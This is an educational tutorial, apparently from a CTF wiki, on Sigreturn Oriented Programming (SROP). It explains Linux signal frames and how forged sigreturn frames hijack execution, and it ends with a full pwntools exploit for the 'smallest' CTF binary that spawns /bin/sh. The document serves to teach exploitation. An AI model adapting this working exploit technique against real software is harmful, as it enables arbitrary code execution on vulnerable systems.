# SROP

## Introduction

SROP (Sigreturn Oriented Programming) was proposed by Erik Bosman from Vrije Universiteit Amsterdam in 2014. The related research **`Framing Signals — A Return to Portable Shellcode`** was published at the top security conference [Oakland 2014](http://www.ieee-security.org/TC/SP2014) and was selected as one of the [Best Student Papers](http://www.ieee-security.org/TC/SP2014/awards.html) of that year. The links to the related paper and slides are as follows:

[paper](http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf)

[slides](https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf)

Among these, `sigreturn` is a system call that is indirectly invoked when a signal occurs in Unix-like systems.

## Signal Mechanism

The signal mechanism is a method for inter-process communication in Unix-like systems. Generally, we also refer to it as a software interrupt signal, or soft interrupt. For example, processes can send soft interrupt signals to each other through the kill system call. Generally speaking, the common steps of the signal mechanism are as shown in the figure below:

![Process of Signal Handlering](figure/ProcessOfSignalHandlering.png)

1. The kernel sends a signal to a process, and the process is temporarily suspended and enters kernel mode.

2. The kernel saves the corresponding context for the process, **mainly by pushing all registers onto the stack, as well as pushing signal information and the system call address pointing to sigreturn**. At this point, the stack structure is as shown in the figure below. We call the ucontext and siginfo section the Signal Frame. **It should be noted that this part is in the user process's address space.** Afterwards, it jumps to the registered signal handler to handle the corresponding signal. Therefore, when the signal handler finishes executing, it will execute the sigreturn code.

    ![signal2-stack](figure/signal2-stack.png)

    For the Signal Frame, it will differ depending on the architecture. Here we provide the sigcontext for x86 and x64 respectively.

    -   x86

    ```c
    struct sigcontext
    {
      unsigned short gs, __gsh;
      unsigned short fs, __fsh;
      unsigned short es, __esh;
      unsigned short ds, __dsh;
      unsigned long edi;
      unsigned long esi;
      unsigned long ebp;
      unsigned long esp;
      unsigned long ebx;
      unsigned long edx;
      unsigned long ecx;
      unsigned long eax;
      unsigned long trapno;
      unsigned long err;
      unsigned long eip;
      unsigned short cs, __csh;
      unsigned long eflags;
      unsigned long esp_at_signal;
      unsigned short ss, __ssh;
      struct _fpstate * fpstate;
      unsigned long oldmask;
      unsigned long cr2;
    };
    ```

    -   x64

    ```c
    struct _fpstate
    {
      /* FPU environment matching the 64-bit FXSAVE layout.  */
      __uint16_t		cwd;
      __uint16_t		swd;
      __uint16_t		ftw;
      __uint16_t		fop;
      __uint64_t		rip;
      __uint64_t		rdp;
      __uint32_t		mxcsr;
      __uint32_t		mxcr_mask;
      struct _fpxreg	_st[8];
      struct _xmmreg	_xmm[16];
      __uint32_t		padding[24];
    };

    struct sigcontext
    {
      __uint64_t r8;
      __uint64_t r9;
      __uint64_t r10;
      __uint64_t r11;
      __uint64_t r12;
      __uint64_t r13;
      __uint64_t r14;
      __uint64_t r15;
      __uint64_t rdi;
      __uint64_t rsi;
      __uint64_t rbp;
      __uint64_t rbx;
      __uint64_t rdx;
      __uint64_t rax;
      __uint64_t rcx;
      __uint64_t rsp;
      __uint64_t rip;
      __uint64_t eflags;
      unsigned short cs;
      unsigned short gs;
      unsigned short fs;
      unsigned short __pad0;
      __uint64_t err;
      __uint64_t trapno;
      __uint64_t oldmask;
      __uint64_t cr2;
      __extension__ union
        {
          struct _fpstate * fpstate;
          __uint64_t __fpstate_word;
        };
      __uint64_t __reserved1 [8];
    };
    ```

3. After the signal handler returns, the kernel executes the sigreturn system call to restore the previously saved context for the process, which includes popping all pushed registers back to their corresponding registers, and finally resuming the process execution. The 32-bit sigreturn call number is 119 (0x77), and the 64-bit system call number is 15 (0xf).

## Attack Principle

Let's carefully review the kernel's work during signal handling. We can see that the kernel's main work is saving and restoring the context for the process. The main changes are all in the Signal Frame. However, it should be noted that:

- The Signal Frame is saved in the user's address space, so the user can read and write it.
- Since the kernel is agnostic about signal handlers, it does not record the Signal Frame corresponding to a signal. Therefore, when the sigreturn system call is executed, the current Signal Frame is not necessarily the one previously saved by the kernel for the user process.

At this point, the basic exploitation principle of SROP has emerged. Below are two simple examples.

### Getting a Shell

First, we assume the attacker can control the user process's stack, then they can forge a Signal Frame. As shown in the figure below, using 64-bit as an example, here is more detailed information about the Signal Frame:

![signal2-stack](./figure/srop-example-1.png)

After the system executes the sigreturn system call, it will execute a series of pop instructions to restore the corresponding register values. When it reaches rip, the program execution flow will be directed to the syscall address. Based on the corresponding register values, at this point, a shell will be obtained.

### System Call Chains

It should be pointed out that in the above example, we only obtained a single shell. Sometimes, we may want to execute a series of functions. We only need to make two modifications:

- **Control the stack pointer.**
- **Replace the original `syscall` gadget that rip points to with a `syscall; ret` gadget.**

As shown in the figure below, this way every time syscall returns, the stack pointer will point to the next Signal Frame. Therefore, a series of sigreturn function calls can be executed.

![signal2-stack](./figure/srop-example-2.png)

### Follow-up

It should be noted that when constructing the ROP attack, the following conditions need to be met:

-   **The stack content can be controlled through stack overflow**
-   **The corresponding addresses need to be known**
    -   **"/bin/sh"**
    -   **Signal Frame**
    -   **syscall**
    -   **sigreturn**
-   There needs to be enough space to fit the entire signal frame

Additionally, the two gadgets sigreturn and syscall;ret were not mentioned above. The author of the paper proposing this attack found certain addresses where these gadgets appear:

![gadget1](./figure/srop-gadget-1.png)

Furthermore, the author found that on some systems the SROP addresses are randomized, while on others they are not. For example, `Linux < 3.3 x86_64` (the default kernel in Debian 7.0, Ubuntu Long Term Support, CentOS 6 systems), the syscall&return code snippets can be found directly at fixed addresses in vsyscall. As follows:

![gadget1](./figure/srop-gadget-2.png)

However, it has now been replaced by the `vsyscall-emulate` and `vdso` mechanisms. Additionally, most systems currently enable ASLR protection, so these gadgets are relatively not easy to find.

It is worth mentioning that for the sigreturn system call, in 64-bit systems, the sigreturn system call corresponds to system call number 15. You only need RAX=15 and execute syscall to make the syscall call. The value of the RAX register can be indirectly controlled through the return value of some function, for example, the return value of the read function is the number of bytes read.

## Exploitation Tools

**It is worth noting that the current pwntools has integrated support for SROP attacks.**

## Example

Here we use the smallest-pwn challenge from the 360 Chunqiu Cup as a simple introduction. The basic steps are as follows:

**Determine Basic File Information**

```text
➜  smallest file smallest
smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```

We can see that this program is a 64-bit statically linked version.

**Check Protections**

```text
➜  smallest checksec smallest
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The program mainly has NX protection enabled.

**Vulnerability Discovery**

Using IDA to directly decompile, we found that the program has only a few lines of assembly code, as follows:

```asm
public start
start proc near
xor     rax, rax
mov     edx, 400h
mov     rsi, rsp
mov     rdi, rax
syscall
retn
start endp
```

Since the syscall number is 0, we can determine that the instruction executed by this program is read(0,$rsp,400), which reads 400 characters to the top of the stack. Without a doubt, there is a stack overflow here.

**Exploitation Strategy**

Since there is no sigreturn call in the program, we need to construct one ourselves. Fortunately, there is a read function call here, so we can set the value of rax through the number of bytes read by the read function. The key ideas are as follows:

- Control the number of characters read by read to set the RAX register value, thereby executing sigreturn
- Execute execve("/bin/sh",0,0) through syscall to get a shell.

**Exploit Program**

```python
from pwn import *
from LibcSearcher import *
small = ELF('./smallest')
if args['REMOTE']:
    sh = remote('127.0.0.1', 7777)
else:
    sh = process('./smallest')
context.arch = 'amd64'
context.log_level = 'debug'
syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0
## set start addr three times
payload = p64(start_addr) * 3
sh.send(payload)

## modify the return addr to start_addr+3
## so that skip the xor rax,rax; then the rax=1
## get stack addr
sh.send('\xb3')
stack_addr = u64(sh.recv()[8:16])
log.success('leak stack addr :' + hex(stack_addr))

## make the rsp point to stack_addr
## the frame is read(0,stack_addr,0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(start_addr) + 'a' * 8 + str(sigframe)
sh.send(payload)

## set rax=15 and call sigreturn
sigreturn = p64(syscall_ret) + 'b' * 7
sh.send(sigreturn)

## call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + 'b' * 8 + str(sigframe)
print len(frame_payload)
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
sh.send(payload)
sh.send(sigreturn)
sh.interactive()
```

The basic flow is:

- Read three program start addresses
- When the program returns, use the first program start address to read addresses, modify the return address (i.e., the second program start address) to the second instruction of the original program, and set rax=1
- At this point, write(1,$esp,0x400) will be executed, leaking the stack address.
- Use the third program start address to read in the payload
- Read again to construct a sigreturn call, which then reads data into the stack address location, constructing execve('/bin/sh',0,0)
- Read again to construct a sigreturn call, thereby obtaining a shell.

## Challenges

- [Defcon 2015 Qualifier: fuckup](https://brant-ruan.github.io/resources/Binary/learnPwn/fuckup_56f604b0ea918206dcb332339a819344)

Reference Reading

- [Sigreturn Oriented Programming (SROP) Attack Principle](http://www.freebuf.com/articles/network/87447.html)
- [SROP by Angel Boy](https://www.slideshare.net/AngelBoy1/sigreturn-ori)
- [System Calls](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)
